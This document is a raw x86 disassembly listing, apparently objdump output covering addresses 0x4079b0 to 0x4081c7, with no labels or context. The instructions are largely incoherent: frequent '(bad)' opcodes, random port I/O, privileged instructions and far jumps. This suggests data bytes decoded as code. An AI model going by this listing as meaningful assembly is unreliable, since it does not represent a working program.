  4079b0:	in     eax,0xbc
  4079b2:	mov    ebx,0xb5d6ccee
  4079b7:	mov    eax,0xda0ad5c0
  4079bc:	in     al,0xd5
  4079be:	enter  0x7fb,0xdd
  4079c2:	or     edi,eax
  4079c4:	(bad)  
  4079c5:	(bad)  
  4079c7:	xlat   BYTE PTR ds:[ebx]
  4079c8:	out    0xb1,eax
  4079ca:	mov    dh,0xe2
  4079cc:	into   
  4079cd:	ror    ah,cl
  4079cf:	std    
  4079d0:	xlat   BYTE PTR ds:[ebx]
  4079d1:	mov    dh,0xbc
  4079d3:	into   
  4079d4:	cld    
  4079d5:	(bad)  
  4079d6:	out    dx,eax
  4079d7:	rcl    ah,cl
  4079d9:	(bad)  
  4079db:	ror    BYTE PTR [eax],1
  4079dd:	cmc    
  4079de:	bswap  ecx
  4079e0:	in     al,dx
  4079e1:	out    dx,eax
  4079e2:	add    al,al
  4079e4:	out    0xf3,al
  4079e6:	test   eax,0xe5b3d1b6
  4079eb:	jmp    0xdcc4:0xccc4c7d6
  4079f2:	enter  0xe1e1,0xd1
  4079f6:	mov    ch,0xf9
  4079f8:	fld    DWORD PTR [edi+edi*8]
  4079fb:	in     eax,0xd9
  4079fd:	(bad)  
  4079ff:	in     eax,0xc5
  407a01:	push   es
  407a02:	movntq (bad),mm5
  407a03:	out    0xed,eax
  407a05:	ret    0xd1bf
  407a08:	mov    al,0xc1
  407a0a:	in     eax,0xc4
  407a0c:	retf   0xfed5
  407a0f:	lods   al,BYTE PTR ds:[esi]
  407a10:	idiv   DWORD PTR [esi-0x17472b16]
  407a16:	add    ebp,edx
  407a18:	shl    bl,1
  407a1a:	add    al,0xf6
  407a1c:	add    al,0xd8
  407a1e:	(bad)  
  407a1f:	out    0xa,al
  407a21:	repz retf 0xc6cb
  407a25:	lods   eax,DWORD PTR ds:[esi]
  407a26:	loop   0x4079fb
  407a28:	out    dx,al
  407a29:	mov    dh,0xb6
  407a2b:	icebp  
  407a2c:	mov    ah,0xe6
  407a2e:	xlat   BYTE PTR ds:[ebx]
  407a2f:	leave  
  407a30:	out    dx,eax
  407a31:	aad    0xbf
  407a33:	loop   0x4079fd
  407a35:	sti    
  407a36:	loopne 0x407a09
  407a38:	(bad)  
  407a39:	cld    
  407a3a:	(bad)  
  407a3b:	(bad)  
  407a3c:	fld    DWORD PTR ds:0x13f9e9e5
  407a42:	(bad)  
  407a45:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407a46:	test   al,0xb2
  407a48:	mov    dl,0xaa
  407a4a:	in     eax,dx
  407a4b:	loop   0x407a1b
  407a4d:	enter  0xd0fa,0xd7
  407a51:	fsin   
  407a53:	cmc    
  407a54:	jecxz  0x407a49
  407a56:	aam    0xff
  407a58:	std    
  407a59:	in     al,dx
  407a5a:	push   ecx
  407a5c:	rcr    ebp,1
  407a5e:	clc    
  407a5f:	stc    
  407a60:	hlt    
  407a61:	retf   
  407a62:	adc    ah,dl
  407a64:	icebp  
  407a65:	lods   eax,DWORD PTR ds:[esi]
  407a66:	mov    dl,0xc4
  407a68:	repnz iret 
  407a6a:	retf   
  407a6b:	iret   
  407a6c:	out    0xb7,eax
  407a6e:	(bad)  
  407a6f:	mov    ecx,0xceebdefc
  407a74:	int3   
  407a75:	out    0x2,eax
  407a77:	in     eax,dx
  407a78:	mov    esp,0xf7fde0db
  407a7d:	fiadd  DWORD PTR [ecx]
  407a7f:	in     al,0xe4
  407a81:	hlt    
  407a82:	pop    es
  407a83:	add    DWORD PTR [ecx-0x1f2d0c39],edi
  407a89:	loope  0x407a37
  407a8b:	int3   
  407a8c:	(bad)
  407a8f:	int    0xf3
  407a91:	(bad)  
  407a93:	fidivr DWORD PTR [esi+0x7f003fe]
  407a99:	mov    esp,0xc6d4fad8
  407a9e:	jmp    0x407a8e
  407aa0:	sti    
  407aa1:	out    dx,eax
  407aa2:	or     ecx,edi
  407aa4:	mov    edi,0xd5dca8c0
  407aa9:	repnz test eax,0xb6d4baed
  407aaf:	mov    edx,0xe3f4caf5
  407ab4:	stc    
  407ab5:	rol    DWORD PTR [esi],cl
  407ab7:	loopne 0x407ab7
  407ab9:	repz loopne 0x407a97
  407abc:	mov    edi,0xfae1e206
  407ac1:	repz or ch,ch
  407ac4:	lods   al,BYTE PTR ds:[esi]
  407ac5:	icebp  
  407ac6:	repnz lods al,BYTE PTR ds:[esi]
  407ac8:	lock icebp 
  407aca:	leave  
  407acb:	jmp    0x407a93
  407acd:	mov    dh,0xcc
  407acf:	aad    0xdc
  407ad1:	int3   
  407ad2:	into   
  407ad3:	jecxz  0x407acd
  407ad5:	xlat   BYTE PTR ds:[ebx]
  407ad6:	int3   
  407ad7:	lock pop es
  407ad9:	add    cl,dh
  407adb:	sti    
  407adc:	ret    
  407add:	jmp    0xddfc:0xefc8f6d9
  407ae4:	mov    bl,0xc4
  407ae6:	in     al,0xb0
  407ae8:	out    0xcf,eax
  407aea:	retf   
  407aeb:	in     eax,dx
  407aec:	mov    al,0xd2
  407aee:	int3   
  407aef:	iret   
  407af0:	in     eax,dx
  407af1:	icebp  
  407af2:	mov    ch,0xea
  407af4:	iret   
  407af5:	pop    es
  407af6:	aad    0xd3
  407af8:	mov    ebp,0x2fde4f8
  407afd:	cli    
  407afe:	push   es
  407aff:	loop   0x407b0b
  407b01:	adc    eax,DWORD PTR ds:0xe5aadf11
  407b07:	shl    ebp,1
  407b09:	mov    bh,0xf7
  407b0b:	repnz mov ah,0xd5
  407b0e:	mov    ah,0xfb
  407b10:	lock xlat BYTE PTR ds:[ebx]
  407b12:	jmp    ecx
  407b14:	aad    0xd6
  407b16:	sti    
  407b17:	cli    
  407b18:	(bad)  
  407b1a:	jmp    0xeffe:0xfb0ff9dc
  407b21:	jmp    0xcbe6:0xe8c80fcc
  407b28:	fmul   st(3),st
  407b2a:	int    0xfa
  407b2c:	jmp    0xdb19732b
  407b31:	fucomi st,st(6)
  407b33:	mov    eax,0xe3f6fad9
  407b38:	(bad)  
  407b39:	idiv   ebp
  407b3b:	cld    
  407b3c:	add    edi,edi
  407b3e:	(bad)  
  407b3f:	out    0xc4,al
  407b41:	iret   
  407b42:	fstp   st(5)
  407b44:	lods   al,BYTE PTR ds:[esi]
  407b45:	mov    al,0xf1
  407b47:	sar    DWORD PTR [esp+edi*4-0x103b161c],cl
  407b4e:	out    0xc4,eax
  407b50:	in     eax,0xca
  407b52:	(bad)  
  407b54:	loop   0x407b55
  407b56:	aad    0xdf
  407b58:	mov    ebp,0xd0c0e1d5
  407b5d:	leave  
  407b5e:	add    ecx,edi
  407b60:	(bad)  
  407b61:	or     bl,dh
  407b63:	adc    ebx,ecx
  407b65:	xlat   BYTE PTR ds:[ebx]
  407b66:	jmp    0xd8cf:0xeaedd7ea
  407b6d:	(bad)  
  407b6f:	mov    edx,0xb8d9dfb8
  407b74:	aad    0xf6
  407b76:	(bad)  
  407b77:	mov    eax,0xdad8e6ff
  407b7c:	loope  0x407b5e
  407b7e:	dec    dl
  407b80:	mov    DWORD PTR [eax],0xb2c1ea01
  407b86:	repz retf 
  407b88:	jmp    0xf1da:0xe7bbb3c1
  407b8f:	out    dx,al
  407b90:	icebp  
  407b91:	fnsave [ebp-0xb2b0f2d]
  407b97:	jecxz  0x407b5a
  407b99:	(bad)  
  407b9a:	fcmovb st,st(7)
  407b9c:	fimul  WORD PTR [edx]
  407b9e:	add    ch,dl
  407ba0:	or     ecx,esp
  407ba2:	add    eax,DWORD PTR [edi]
  407ba4:	iret   
  407ba5:	jecxz  0x407b7a
  407ba7:	rcl    ebx,1
  407ba9:	shl    ch,0xc6
  407bac:	leave  
  407bad:	out    dx,al
  407bae:	jmp    0x407b64
  407bb0:	fnstsw WORD PTR [edx-0x29372429]
  407bb6:	pop    es
  407bb7:	cli    
  407bb8:	fistp  QWORD PTR [ebp-0x14fc2023]
  407bbe:	fsub   st,st(3)
  407bc0:	or     cl,bh
  407bc2:	add    edx,ebx
  407bc4:	in     al,0xc3
  407bc6:	in     al,dx
  407bc7:	enter  0xcbb2,0xd2
  407bcb:	mov    dh,0xfb
  407bcd:	out    0xca,al
  407bcf:	retf   
  407bd0:	mov    ch,0xf9
  407bd2:	retf   0xfbf7
  407bd5:	stc    
  407bd6:	not    esp
  407bd8:	int3   
  407bd9:	push   edi
  407bdb:	icebp  
  407bdc:	not    dh
  407bde:	(bad)  
  407bdf:	cld    
  407be0:	jmp    0x407baf
  407be2:	fmul   st(6),st
  407be4:	mov    edi,0xf7bcb7ed
  407be9:	lods   eax,DWORD PTR ds:[esi]
  407bea:	rcl    al,1
  407bec:	lds    edi,FWORD PTR [edx-0x82e052a]
  407bf2:	out    dx,al
  407bf3:	fadd   DWORD PTR [ecx]
  407bf5:	int    0xfa
  407bf7:	out    0xd4,al
  407bf9:	(bad)  
  407bfb:	aad    0xe1
  407bfd:	jecxz  0x407c06
  407bff:	retf   
  407c00:	cli    
  407c01:	(bad)  
  407c03:	cli    
  407c04:	into   
  407c05:	out    0xcd,al
  407c07:	retf   
  407c08:	lock (bad) 
  407c0a:	shl    cl,1
  407c0c:	int    0xca
  407c0e:	div    DWORD PTR [edi+esi*4+0x3c8eaef]
  407c15:	repnz stc 
  407c17:	rcr    cl,cl
  407c19:	or     edi,DWORD PTR [ecx+ebp*8-0x26fdf617]
  407c20:	in     eax,0xda
  407c22:	in     eax,0xc0
  407c24:	retf   
  407c25:	mov    cl,0xe9
  407c27:	mov    esi,0xd9f2e8f3
  407c2c:	mov    ah,0xd0
  407c2e:	sar    edi,cl
  407c30:	mov    eax,0xfed1f2bb
  407c35:	mov    ebp,0x2f7ffcd
  407c3a:	repnz (bad) [ebx]
  407c3d:	aad    0xff
  407c3f:	or     cl,BYTE PTR ds:0xe1ec04da
  407c45:	(bad)  
  407c46:	scas   eax,DWORD PTR es:[edi]
  407c47:	(bad)  
  407c48:	in     al,dx
  407c49:	mov    al,0xd5
  407c4b:	sar    DWORD PTR [ebx-0x2f0e0e4c],cl
  407c51:	int    0xbc
  407c53:	int3   
  407c54:	jmp    0xe7467e38
  407c59:	jecxz  0x407c46
  407c5b:	jecxz  0x407c22
  407c5d:	cli    
  407c5e:	or     al,ah
  407c60:	out    0xe1,al
  407c62:	loope  0x407c4f
  407c64:	retf   0xe4df
  407c67:	loope  0x407c37
  407c69:	rol    edx,0xcf
  407c6c:	leave  
  407c6d:	mov    ch,0xc5
  407c6f:	(bad)  
  407c70:	fptan  
  407c72:	add    ebp,esi
  407c74:	aad    0xf6
  407c76:	fstp   TBYTE PTR [edi+eiz*8+0x2dbbde7]
  407c7d:	or     DWORD PTR [ebp*8-0x3ff4f615],eax
  407c84:	repz fadd st,st(5)
  407c87:	(bad)  
  407c88:	stos   DWORD PTR es:[edi],eax
  407c89:	stos   BYTE PTR es:[edi],al
  407c8a:	shl    DWORD PTR [eax-0x2a072535],0xf6
  407c91:	fucomp st(0)
  407c93:	mov    eax,0xfdd2f7ff
  407c98:	ret    0xfc02
  407c9b:	loop   0x407c7f
  407c9d:	add    bh,BYTE PTR [ebp-0x2c202bf1]
  407ca3:	fucom  st(5)
  407ca5:	mov    eax,0xeacab3f1
  407caa:	cmc    
  407cab:	into   
  407cac:	aad    0xd5
  407cae:	out    0xc9,eax
  407cb0:	int3   
  407cb1:	shr    bh,cl
  407cb3:	mov    esi,0xbd02bdec
  407cb8:	test   BYTE PTR [eax],0xd1
  407cbb:	icebp  
  407cbc:	neg    dh
  407cbe:	out    0xe9,al
  407cc0:	(bad)  
  407cc1:	loope  0x407cd6
  407cc3:	cli    
  407cc4:	jmp    0x407c78
  407cc6:	scas   al,BYTE PTR es:[edi]
  407cc7:	mov    bh,0xab
  407cc9:	mov    bl,0xf5
  407ccb:	ror    edi,1
  407ccd:	(bad)  
  407cce:	mov    edi,0xdbddfdce
  407cd3:	repnz loope 0x407cb5
  407cd6:	out    dx,eax
  407cd7:	fsub   st,st(6)
  407cd9:	jmp    ebx
  407cdb:	add    eax,0xcbd7deca
  407ce0:	cmc    
  407ce1:	(bad)  
  407ce2:	jecxz  0x407ce9
  407ce4:	ret    
  407ce5:	jmp    0x407cdd
  407ce7:	xlat   BYTE PTR ds:[ebx]
  407ce8:	(bad)
  407cec:	aad    0xcc
  407cee:	lock aam 0xde
  407cf1:	call   0xc3fe5ccf
  407cf6:	fcmovnbe st,st(0)
  407cf8:	idiv   al
  407cfa:	(bad)  
  407cfb:	aam    0xc5
  407cfd:	add    eax,DWORD PTR [esi+eax*1]
  407d00:	(bad)  
  407d02:	psrld  mm1,mm0
  407d05:	jmp    0xd2d5:0xc7edc3ae
  407d0c:	fidiv  DWORD PTR [ecx+0x3dafbbf]
  407d12:	jecxz  0x407ce4
  407d14:	faddp  st(1),st
  407d16:	add    ebp,ebp
  407d18:	mov    ebp,0xf4d0e1e0
  407d1d:	jmp    0xdafc:0x5def407
  407d24:	out    dx,eax
  407d25:	(bad)  
  407d26:	in     al,0xe0
  407d28:	mov    ch,0xcf
  407d2a:	neg    cl
  407d2c:	(bad)  
  407d2d:	rcl    dl,1
  407d2f:	out    dx,eax
  407d30:	fcmove st,st(1)
  407d32:	fmul   st(4),st
  407d34:	mov    ecx,0xe6f3f0f5
  407d39:	shl    ch,cl
  407d3b:	icebp  
  407d3c:	fld1   
  407d3e:	sti    
  407d3f:	leave  
  407d40:	jmp    0x407d4f
  407d42:	out    dx,eax
  407d43:	add    DWORD PTR [ecx-0xb0d3b17],esi
  407d49:	rol    ebx,cl
  407d4b:	mov    ah,0xb7
  407d4d:	out    0xca,al
  407d4f:	mov    eax,0xffdacdf3
  407d54:	std    
  407d55:	loop   0x407d2d
  407d57:	(bad)  
  407d58:	dec    esp
  407d5a:	jmp    0xe6f8:0xc8f4f4d5
  407d61:	retf   
  407d62:	cld    
  407d63:	loop   0x407d27
  407d65:	iret   
  407d66:	scas   al,BYTE PTR es:[edi]
  407d67:	ret    0xd3c4
  407d6a:	lods   al,BYTE PTR ds:[esi]
  407d6b:	in     al,0xba
  407d6d:	sti    
  407d6e:	in     al,0xde
  407d70:	stc    
  407d71:	lock jmp 0x407d46
  407d74:	mov    bh,0xd9
  407d76:	repz add esp,esi
  407d79:	fcmovb st,st(7)
  407d7b:	add    edi,eax
  407d7d:	ret    0x7d8
  407d80:	push   es
  407d81:	retf   
  407d82:	or     cl,ch
  407d84:	into   
  407d85:	fidiv  WORD PTR [edx-0x41f4f22]
  407d8b:	mov    dl,0xd3
  407d8d:	mov    ch,0xfa
  407d8f:	hlt    
  407d90:	repz mov ecx,0xddc9d9eb
  407d96:	cld    
  407d97:	in     al,dx
  407d98:	aad    0xec
  407d9a:	in     eax,0xc1
  407d9c:	lock shl bh,1
  407d9f:	(bad)
  407da2:	jmp    0xb4085fa3
  407da7:	shl    eax,cl
  407da9:	mov    dh,0xb6
  407dab:	stc    
  407dac:	into   
  407dad:	in     eax,dx
  407dae:	out    0xfb,al
  407db0:	frndint 
  407db2:	fdivr  QWORD PTR [ebx-0x21252503]
  407db8:	mov    esi,0xc6fcf5c2
  407dbd:	aam    0xd9
  407dbf:	jmp    0x407dcc
  407dc1:	ret    0x7fd
  407dc4:	jecxz  0x407dae
  407dc6:	icebp  
  407dc7:	mov    bl,0xb3
  407dc9:	out    0xb6,al
  407dcb:	hlt    
  407dcc:	enter  0xe7fa,0xdd
  407dd0:	aad    0xb9
  407dd2:	mov    ch,0xf0
  407dd4:	loop   0x407dd2
  407dd6:	int    0xc2
  407dd8:	xlat   BYTE PTR ds:[ebx]
  407dd9:	push   es
  407dda:	push   es
  407ddb:	or     esi,esp
  407ddd:	enter  0xdd05,0x3
  407de1:	(bad)  
  407de3:	cld    
  407de4:	mov    esi,0xd6f5b3c3
  407de9:	mov    dl,0xd2
  407deb:	(bad)  
  407ded:	in     al,dx
  407dee:	aad    0xfe
  407df0:	repz (bad) 
  407df2:	mov    esp,0xfadfccf2
  407df7:	(bad)  
  407df9:	std    
  407dfa:	add    ah,bl
  407dfc:	sar    esi,1
  407dfe:	in     al,0x1
  407e00:	int    0xdf
  407e02:	fcmovnu st,st(7)
  407e04:	int3   
  407e05:	repz jecxz 0x407db9
  407e08:	fadd   st(7),st
  407e0a:	out    dx,al
  407e0b:	out    0xea,al
  407e0d:	(bad)  
  407e0f:	aam    0xc4
  407e11:	repz clc 
  407e13:	(bad)  
  407e14:	push   DWORD PTR [esi-0x63a032a]
  407e1a:	ret    0xe8c2
  407e1d:	in     al,0xc0
  407e1f:	(bad)  
  407e20:	stc    
  407e21:	loope  0x407e35
  407e23:	(bad)  
  407e24:	mov    ebp,0xc4cab1e7
  407e29:	shl    esp,1
  407e2b:	loop   0x407e05
  407e2d:	mov    edx,0xd8cabbff
  407e32:	clc    
  407e33:	out    dx,al
  407e34:	cli    
  407e35:	int3   
  407e36:	out    0xd8,eax
  407e38:	out    0xfa,al
  407e3a:	mul    edi
  407e3c:	(bad)  
  407e3d:	neg    ebx
  407e3f:	out    0xc6,al
  407e41:	jmp    0x407e26
  407e43:	add    dh,BYTE PTR [ecx-0x1c494d3f]
  407e49:	call   0xb4f65f03
  407e4e:	mov    ah,0xeb
  407e50:	in     al,0xb8
  407e52:	sti    
  407e53:	loop   0x407e45
  407e55:	mov    dh,0xb8
  407e57:	pop    es
  407e58:	out    0xd5,al
  407e5a:	mov    esp,0xe5d7dfb8
  407e5f:	(bad)  
  407e60:	les    ecx,FWORD PTR ds:0xd2c9e90a
  407e66:	in     eax,dx
  407e67:	lods   al,BYTE PTR ds:[esi]
  407e68:	loop   0x407e57
  407e6a:	retf   0xd7c4
  407e6d:	mov    ah,0xb5
  407e6f:	cmc    
  407e70:	mov    edi,0xb7ffceec
  407e75:	mov    esp,0xbae3d0ff
  407e7a:	add    eax,0xdbebe4d7
  407e7f:	retf   
  407e80:	enter  0xeae9,0x4
  407e84:	out    dx,al
  407e85:	int3   
  407e86:	shl    BYTE PTR [ebx+eax*8-0x2a491b1a],0xbb
  407e8e:	out    0xf4,al
  407e90:	cmc    
  407e91:	call   0x445a73
  407e96:	into   
  407e97:	push   es
  407e98:	(bad)  
  407e9a:	rol    DWORD PTR [edi],1
  407e9c:	pop    es
  407e9d:	sti    
  407e9e:	out    dx,al
  407e9f:	add    eax,DWORD PTR [ecx]
  407ea1:	in     eax,dx
  407ea2:	in     al,dx
  407ea3:	iret   
  407ea4:	out    0xc8,al
  407ea6:	scas   eax,DWORD PTR es:[edi]
  407ea7:	mov    bl,0xb7
  407ea9:	ret    
  407eaa:	in     eax,dx
  407eab:	loop   0x407e6d
  407ead:	in     al,0xc4
  407eaf:	hlt    
  407eb0:	mov    ch,0xd0
  407eb2:	lock fucomi st,st(6)
  407eb5:	int3   
  407eb6:	aam    0xd1
  407eb8:	mov    esi,0xf509b9f6
  407ebd:	stc    
  407ebe:	add    esp,esp
  407ec0:	clc    
  407ec1:	(bad)  
  407ec2:	jmp    0xd21944ce
  407ec7:	jecxz  0x407e9e
  407ec9:	lods   eax,DWORD PTR ds:[esi]
  407eca:	out    dx,al
  407ecb:	vpsubsw xmm4,xmm2,xmm6
  407ecf:	leave  
  407ed0:	repz into 
  407ed2:	fstp   st(6)
  407ed4:	fdiv   st(2),st
  407ed6:	fiadd  DWORD PTR [ebx]
  407ed8:	(bad)  
  407ed9:	hlt    
  407eda:	(bad)  
  407edb:	out    0xbf,eax
  407edd:	push   es
  407ede:	add    dl,dh
  407ee0:	add    ah,al
  407ee2:	rcl    DWORD PTR [ebx],cl
  407ee4:	in     eax,0xe8
  407ee6:	enter  0xe3cd,0xcc
  407eea:	mov    cl,0xf7
  407eec:	aam    0xfa
  407eee:	mov    edx,0xf2cfeecb
  407ef3:	icebp  
  407ef4:	shl    BYTE PTR [esi-0x221e0c13],1
  407efa:	cld    
  407efb:	add    eax,DWORD PTR [ebx]
  407efd:	fimul  DWORD PTR [ebx]
  407eff:	or     ch,ah
  407f01:	int3   
  407f02:	push   es
  407f03:	add    bl,al
  407f05:	retf   
  407f06:	shr    DWORD PTR [eax-0x13040c16],cl
  407f0c:	mov    bh,0xe6
  407f0e:	div    BYTE PTR [esi-0x36091646]
  407f14:	ffreep st(1)
  407f16:	add    edi,edx
  407f18:	add    ebp,esi
  407f1a:	(bad)  
  407f1b:	shr    edx,1
  407f1d:	jmp    0x407f0d
  407f1f:	(bad)  
  407f20:	enter  0x9ff,0xe6
  407f24:	int    0xef
  407f26:	fsub   st(1),st
  407f28:	rcr    esp,cl
  407f2a:	iret   
  407f2b:	loopne 0x407edd
  407f2d:	in     eax,0xc4
  407f2f:	repnz fdiv st(4),st
  407f32:	fsubr  st,st(5)
  407f34:	iret   
  407f35:	loope  0x407f2b
  407f37:	std    
  407f38:	cmc    
  407f39:	loope  0x407f46
  407f3b:	in     al,0xc7
  407f3d:	lock loopne 0x407f2f
  407f40:	aam    0xfa
  407f42:	add    eax,0xbee4e5d8
  407f47:	leave  
  407f48:	ret    
  407f49:	mov    bh,0xc3
  407f4b:	cmc    
  407f4c:	in     eax,0xdf
  407f4e:	fidivr DWORD PTR [esi-0x1d0f2c37]
  407f54:	sti    
  407f55:	mov    edi,0x3e2f903
  407f5a:	jecxz  0x407f42
  407f5c:	loope  0x407f60
  407f5e:	(bad)  
  407f60:	add    edi,edi
  407f62:	push   es
  407f63:	int3   
  407f64:	into   
  407f65:	loopne 0x407f2f
  407f67:	out    0xe3,al
  407f69:	ret    
  407f6a:	sti    
  407f6b:	mov    dh,0xf8
  407f6d:	(bad)  
  407f6e:	cmc    
  407f6f:	call   eax
  407f71:	(bad)  
  407f73:	ror    ah,1
  407f75:	cmc    
  407f76:	rol    DWORD PTR [esi],cl
  407f78:	clc    
  407f79:	ffreep st(2)
  407f7b:	mov    esp,0xf503ea08
  407f80:	loopne 0x407f5a
  407f82:	(bad)  
  407f84:	jmp    0xc4e1:0xd2eac7d7
  407f8b:	ror    dh,cl
  407f8d:	in     eax,dx
  407f8e:	fcmovne st,st(5)
  407f90:	aad    0xcd
  407f92:	clc    
  407f93:	rcl    dl,cl
  407f95:	fcmovnb st,st(7)
  407f97:	ret    
  407f98:	int    0xbd
  407f9a:	(bad)  
  407f9c:	lock in al,0xc0
  407f9f:	cld    
  407fa0:	add    eax,edx
  407fa2:	in     eax,dx
  407fa3:	(bad)  
  407fa4:	test   al,0xcd
  407fa6:	rcr    ebp,cl
  407fa8:	ret    
  407fa9:	loope  0x407f7c
  407fab:	loopne 0x407f7a
  407fad:	fld    TBYTE PTR [ebp-0x22332109]
  407fb3:	(bad)  
  407fb5:	loop   0x407fae
  407fb7:	icebp  
  407fb8:	rol    BYTE PTR [eax],0xf3
  407fbb:	sar    al,0x0
  407fbe:	(bad)  
  407fbf:	out    dx,eax
  407fc0:	fsubr  st,st(3)
  407fc2:	or     eax,eax
  407fc4:	scas   eax,DWORD PTR es:[edi]
  407fc5:	(bad)
  407fc9:	mov    esp,0xc5cbd6ca
  407fce:	mul    esp
  407fd0:	mov    dh,0xc8
  407fd2:	repnz add ebp,ebp
  407fd5:	pop    es
  407fd6:	fcmovb st,st(0)
  407fd8:	mov    esi,0x6f8c6bc
  407fdd:	leave  
  407fde:	or     bl,al
  407fe0:	int    0xef
  407fe2:	push   es
  407fe3:	or     dl,cl
  407fe5:	fisubr WORD PTR [eax-0x4b492242]
  407feb:	sti    
  407fec:	retf   
  407fed:	in     al,dx
  407fee:	mov    bh,0xeb
  407ff0:	mov    bl,0xb5
  407ff2:	iret   
  407ff3:	fcomp  st(3)
  407ff5:	(bad)  
  407ff7:	xlat   BYTE PTR ds:[ebx]
  407ff8:	mov    esp,0xc1c10be3
  407ffd:	add    eax,0xffebdaff
  408002:	adc    ch,ch
  408004:	shl    DWORD PTR [edx-0x14545115],1
  40800a:	out    0xbb,al
  40800c:	shl    ch,1
  40800e:	icebp  
  40800f:	sar    BYTE PTR [ebx-0x30fc454a],cl
  408015:	pop    es
  408016:	add    esp,edx
  408018:	imul   bl
  40801a:	in     al,0xa
  40801c:	fdivp  st(6),st
  40801e:	in     al,0x5
  408020:	(bad)  
  408021:	(bad)  
  408022:	jmp    0x408032
  408024:	mov    eax,0xe0f1adc7
  408029:	lods   eax,DWORD PTR ds:[esi]
  40802a:	mov    bh,0xd3
  40802c:	xlat   BYTE PTR ds:[ebx]
  40802d:	stc    
  40802e:	clc    
  40802f:	mov    ch,0xdc
  408031:	xlat   BYTE PTR ds:[ebx]
  408032:	fdivr  QWORD PTR [edi-0x84a0107]
  408038:	add    edx,edi
  40803a:	vpminub xmm5,xmm0,xmm2
  40803e:	add    eax,0x60fe20b
  408043:	jmp    0xd4d4:0xf1e1cae8
  40804a:	iret   
  40804b:	rol    ah,cl
  40804d:	mov    edx,0xfdd4b0f7
  408052:	fucomp st(0)
  408054:	mov    ebx,0xc6dad9ce
  408059:	add    edx,ebp
  40805b:	clc    
  40805c:	idiv   ecx
  40805e:	(bad)  
  40805f:	(bad)
  408062:	fadd   st(4),st
  408064:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408066:	in     al,dx
  408067:	retf   
  408068:	out    0xf0,al
  40806a:	in     eax,0xb4
  40806c:	hlt    
  40806d:	int    0xf1
  40806f:	(bad)  
  408071:	leave  
  408072:	lock rcr edx,1
  408075:	mov    esi,0xdb05bef0
  40807a:	mov    cl,0xff
  40807d:	(bad)  
  40807f:	ror    BYTE PTR [edi],0xdc
  408082:	rol    DWORD PTR [ebx],0xb8
  408085:	icebp  
  408086:	lods   al,BYTE PTR ds:[esi]
  408087:	scas   eax,DWORD PTR es:[edi]
  408088:	mov    esp,0xb5f9b2b5
  40808d:	in     eax,0xb6
  40808f:	(bad)
  408092:	(bad)  
  408094:	test   al,0xdc
  408097:	add    eax,0xf7cb05fc
  40809c:	xlat   BYTE PTR ds:[ebx]
  40809d:	or     ebx,esi
  40809f:	aam    0xe
  4080a1:	loope  0x40808a
  4080a3:	fsubr  st,st(5)
  4080a5:	leave  
  4080a6:	loope  0x40808d
  4080a8:	enter  0xfbb6,0xd2
  4080ac:	fyl2xp1 
  4080ae:	(bad)  
  4080af:	call   0xe4325786
  4080b4:	cli    
  4080b5:	cmc    
  4080b6:	mov    ecx,0xf0d1e2f1
  4080bb:	cld    
  4080bc:	call   0xdc1a4691
  4080c1:	jmp    0x40809b
  4080c3:	or     bl,ah
  4080c5:	mov    bl,0xbd
  4080c7:	loope  0x408077
  4080c9:	jmp    0xf110569f
  4080ce:	cli    
  4080cf:	test   dh,0xb5
  4080d2:	add    ebx,esi
  4080d4:	out    dx,al
  4080d5:	idiv   ebx
  4080d7:	(bad)  
  4080d8:	mov    esp,0xaf9c5e6
  4080dd:	or     esp,eax
  4080df:	jecxz  0x4080cd
  4080e1:	or     eax,DWORD PTR [esi]
  4080e3:	or     ebp,DWORD PTR [ebx+esi*4-0x33361e1f]
  4080ea:	into   
  4080eb:	sar    DWORD PTR [edx-0x3b370850],cl
  4080f1:	enter  0xbcba,0xe3
  4080f5:	add    BYTE PTR [ebp-0x27fd1b10],dh
  4080fb:	retf   0xe6db
  4080fe:	retf   
  4080ff:	out    0xc5,eax
  408101:	sti    
  408102:	loope  0x408109
  408104:	mov    ebp,0xedd6e6c5
  408109:	rol    bh,1
  40810b:	lock sti 
  40810d:	int3   
  40810e:	cli    
  40810f:	mov    al,0xf6
  408111:	fdivr  DWORD PTR [ebx+0x6f6b9ea]
  408117:	int    0xe4
  408119:	add    al,0xf0
  40811b:	(bad)  
  40811c:	xlat   BYTE PTR ds:[ebx]
  40811d:	jmp    0x4fb:0x2c3efdb
  408124:	mov    esp,0xe5cca5e9
  408129:	aad    0xd7
  40812b:	mov    dh,0xd6
  40812d:	ror    bh,0xc9
  408130:	(bad)  
  408131:	test   dl,0xd1
  408134:	loope  0x408104
  408136:	pop    es
  408137:	into   
  408138:	repz repnz cmc 
  40813b:	loop   0x40811b
  40813d:	les    ecx,FWORD PTR [eax]
  40813f:	pop    es
  408140:	loop   0x408151
  408142:	loope  0x40812f
  408144:	fdivr  DWORD PTR [esi-0x28104d4f]
  40814a:	aad    0xc7
  40814c:	(bad)  [ecx-0x37460d12]
  408152:	(bad)  
  408153:	std    
  408154:	clc    
  408155:	cmc    
  408156:	add    ecx,eax
  408158:	(bad)  
  40815a:	out    0xe1,al
  40815c:	loop   0x408148
  40815e:	stc    
  40815f:	out    dx,eax
  408160:	jmp    0xf0c1:0xd003fefc
  408167:	in     eax,0xdd
  408169:	(bad)  
  40816a:	iret   
  40816b:	repz hlt 
  40816d:	out    0xd2,eax
  40816f:	retf   
  408170:	ffreep st(4)
  408172:	sti    
  408173:	mov    ebx,0xf1f8f2d5
  408178:	sti    
  408179:	fdivr  st,st(5)
  40817b:	std    
  40817c:	or     eax,esp
  40817e:	retf   
  40817f:	in     eax,dx
  408180:	std    
  408181:	cli    
  408182:	jmp    0xe3ac:0xcfaca709
  408189:	mov    bh,0xb7
  40818b:	sar    DWORD PTR [ecx-0x3408380f],1
  408191:	cmc    
  408192:	fnsave [eax-0x2e4a4218]
  408198:	loopne 0x40816f
  40819a:	fiadd  WORD PTR [ecx]
  40819c:	aad    0xa
  40819e:	add    ebx,edi
  4081a0:	or     al,0x1
  4081a2:	std    
  4081a3:	or     ebx,ebp
  4081a5:	shr    DWORD PTR [ecx-0x341e2820],1
  4081ab:	mov    ah,0xe6
  4081ad:	mov    eax,0xc9b5b4ce
  4081b2:	fsubrp st(3),st
  4081b4:	call   0xf30e7272
  4081b9:	fstp   st(7)
  4081bb:	inc    DWORD PTR [edi]
  4081bd:	xlat   BYTE PTR ds:[ebx]
  4081be:	push   esi
  4081c0:	stc    
  4081c1:	fsub   st(7),st
  4081c3:	into   
  4081c4:	repnz test al,0xbf
  4081c7:	repnz scas al,BYTE PTR es:[edi]
